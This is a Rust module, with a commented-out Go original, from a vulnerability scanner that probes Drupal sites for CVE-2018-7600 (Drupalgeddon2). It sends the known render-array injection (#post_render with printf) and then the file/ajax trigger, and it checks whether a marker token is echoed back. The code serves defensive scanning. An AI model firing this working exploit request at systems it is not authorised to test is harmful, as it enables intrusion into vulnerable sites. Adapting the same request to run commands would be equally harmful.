use crate::{
    scanner::{
        module,
        findings,
        ReportV1,
        Target,
        ModuleName,
    },
    error::PhaserError,
};
use regex::Regex;


pub struct Cve2018_7600{}

impl module::BaseModule for Cve2018_7600 {
    fn name(&self) -> ModuleName {
        return ModuleName::HttpDrupalCve20187600;
    }

    fn description(&self) -> String {
        return "Check for CVE-2018-7600 (a.k.a. Drupalgeddon2)".to_string();
    }

    fn author(&self) -> String {
        return "Sylvain Kerkour <sylvain@kerkour.fr>".to_string();
    }

    fn version(&self) -> String {
        return "0.1.0".to_string();
    }
}

// TODO: error handling not found
impl module::PortModule for Cve2018_7600 {
    fn run(&self, _: &ReportV1, target: &Target, port: &findings::Port) -> Result<findings::ModuleResult, PhaserError> {
        let protocol = if port.http {
            "http"
        } else if port.https {
            "https"
        } else {
            ""
        };

        if protocol.is_empty() {
            return Ok(findings::ModuleResult::None);
        }

        let token = "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314";

        let form = [("form_id", "user_pass"), ("_triggering_element_name", "name")];
        let query_params = [
            ("name[#type]", "markup"),
            ("name[#markup]", &(token.clone())),
            ("name[#post_render][]", "printf"),
            ("q", "user/password"),
        ];


        let url = format!("{}://{}:{}/", &protocol, &target.host, &port.id);
        let client = reqwest::Client::new();
        let body = client.post(&url)
            .query(&query_params)
            .form(&form)
            .send()?
            .text()?;

        let re = Regex::new(r#"<input type="hidden" name="form_build_id" value="([^"]+)" />"#).expect("compiling regexp");

        if let Some(matchs) = re.captures(&body) {
            if matchs.len() > 1 {
                let form_id = &matchs[1];

                let form = [("form_build_id", form_id)];
                let query_params = [
                    ("q", format!("file/ajax/name/#value/{}", form_id)),
                ];
                let body = client.post(&url)
                    .query(&query_params)
                    .form(&form)
                    .send()?
                    .text()?;

                if body.contains(&token) {
                    return Ok(findings::ModuleResult::Url(findings::Url{
                        url,
                    }));
                }
            }
        }

        return Ok(findings::ModuleResult::None);
    }
}


#[cfg(test)]
mod tests {
    use crate::scanner::module::BaseModule;

    #[test]
    fn module_name() {
        let module = super::Cve2018_7600{};
        assert_eq!("http/drupal/cve-2018-7600", module.name().to_string());
    }
}

// package drupal

// import (
// 	"fmt"
// 	"io/ioutil"
// 	"net/http"
// 	"net/url"
// 	"regexp"
// 	"strconv"
// 	"strings"

// 	"github.com/bloom42/phaser/common/phaser"
// 	"github.com/bloom42/phaser/common/phaser/findings"
// 	"github.com/bloom42/phaser/scanner/module"
// )

// type CVE_2018_7600 struct{}

// func (CVE_2018_7600) Name() string {
// 	return "http/drupal/CVE_2018_7600"
// }

// func (CVE_2018_7600) Description() string {
// 	return "Check for CVE-2018-7600 (a.k.a. Drupalgeddon2)"
// }

// func (CVE_2018_7600) Author() string {
// 	return "Sylvain Kerkour <sylvain@kerkour.fr>"
// }

// func (CVE_2018_7600) Version() string {
// 	return "0.1.0"
// }

// func (CVE_2018_7600) Run(scan *phaser.ReportV1, target *phaser.Target, port phaser.Port) (module.Result, []error) {
// 	errs := []error{}
// 	var ret module.Result
// 	protocol := "http"

// 	if !port.HTTP && !port.HTTPS {
// 		return ret, errs
// 	}
// 	if port.HTTPS {
// 		protocol = "https"
// 	}

// 	token := "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314"

// 	URL := fmt.Sprintf("%s://%s:%d/", protocol, target.Host, port.ID)
// 	// &name[#post_render][]=printf&name[#markup]=08d15a4aef553492d8971cdd5198f314\n&name[#type]=markup"
// 	form := url.Values{"form_id": {"user_pass"}, "_triggering_element_name": {"name"}}
// 	req, err := http.NewRequest("POST", URL, strings.NewReader(form.Encode()))
// 	q := req.URL.Query()
// 	q.Add("name[#type]", "markup")
// 	q.Add("name[#markup]", "08d15a4aef553492d8971cdd5198f31408d15a4aef553492d8971cdd5198f314")
// 	q.Add("name[#post_render][]", "printf")
// 	q.Add("q", "user/password")
// 	req.URL.RawQuery = q.Encode()
// 	// fmt.Println(req.URL.String())
// 	if err != nil {
// 		errs = append(errs, err)
// 		return ret, errs
// 	}
// 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded") // req2.Header.Add("Accept-Encoding", "gzip, deflate")
// 	req.Header.Set("User-Agent", scan.Profile.HTTP.UserAgent)
// 	res, err := scan.HTTPClient.Do(req)
// 	if err != nil {
// 		errs = append(errs, err)
// 		return ret, errs
// 	}
// 	body, err := ioutil.ReadAll(res.Body)
// 	if err != nil {
// 		errs = append(errs, err)
// 		return ret, errs
// 	}
// 	res.Body.Close()

// 	re := regexp.MustCompile(`<input type="hidden" name="form_build_id" value="([^"]+)" \/>`)
// 	matchs := re.FindStringSubmatch(string(body))

// 	if len(matchs) > 1 {
// 		formID := matchs[1]
// 		// log.Println(formID)

// 		URL2 := fmt.Sprintf("%s://%s:%d/", protocol, target.Host, port.ID)
// 		// &name[#post_render][]=printf&name[#markup]=08d15a4aef553492d8971cdd5198f314\n&name[#type]=markup"
// 		form2 := url.Values{"form_build_id": {formID}}

// 		// log.Println(form2.Encode())
// 		req2, err := http.NewRequest("POST", URL2, strings.NewReader(form2.Encode()))
// 		if err != nil {
// 			errs = append(errs, err)
// 			return ret, errs
// 		}

// 		q2 := req2.URL.Query()
// 		q2.Add("q", "file/ajax/name/#value/"+formID)

// 		req2.URL.RawQuery = q2.Encode()

// 		// req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
// 		// log.Println(req2.URL.String())
// 		req2.Header.Set("User-Agent", scan.Profile.HTTP.UserAgent)
// 		req2.Header.Set("Content-Type", "application/x-www-form-urlencoded") // req2.Header.Add("Accept-Encoding", "gzip, deflate")
// 		// req2.Header.Set("Accept-Encoding", "identity")
// 		// req2.Header.Set("Accept", "*/*")
// 		req2.Header.Set("Content-Length", strconv.Itoa(len(form2.Encode())))
// 		// log.Printf("%#v\n", req2)
// 		res2, err := scan.HTTPClient.Do(req2)
// 		// res2, err = http.PostForm(req2.URL.String(),
// 		// url.Values{"form_build_id": {formID}})
// 		if err != nil {
// 			errs = append(errs, err)
// 			return ret, errs
// 		}
// 		// request, _ := httputil.DumpRequestOut(req2, true)
// 		// response, _ := httputil.DumpResponse(res2, true)
// 		body2, err := ioutil.ReadAll(res2.Body)
// 		if err != nil {
// 			errs = append(errs, err)
// 			return ret, errs
// 		}
// 		res2.Body.Close()

// 		if strings.Contains(string(body2), token) {
// 			ret = findings.URL{URL: URL}
// 		}

// 		// fmt.Println("Body: ", string(body2))
// 	}

// 	return ret, errs
// }
